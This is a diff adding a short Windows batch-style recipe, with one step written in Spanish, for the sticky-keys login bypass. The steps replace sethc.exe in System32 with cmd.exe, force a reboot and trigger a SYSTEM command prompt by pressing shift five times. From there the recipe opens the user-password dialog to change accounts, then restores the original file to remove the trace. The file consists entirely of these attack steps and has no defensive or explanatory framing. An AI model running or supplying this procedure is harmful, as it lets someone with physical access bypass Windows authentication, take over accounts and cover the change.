@@ -1,0 +1,9 @@
+cd c:\windows\system32
+ren sethc.exe sethc.back
+copy cmd.exe sethc.exe
+shutdown -r -f -t 0
+shift 5 veces
+control userpasswords2
+cd c:\windows\system32
+del sethc.exe
+ren sethc.back sethc.exe
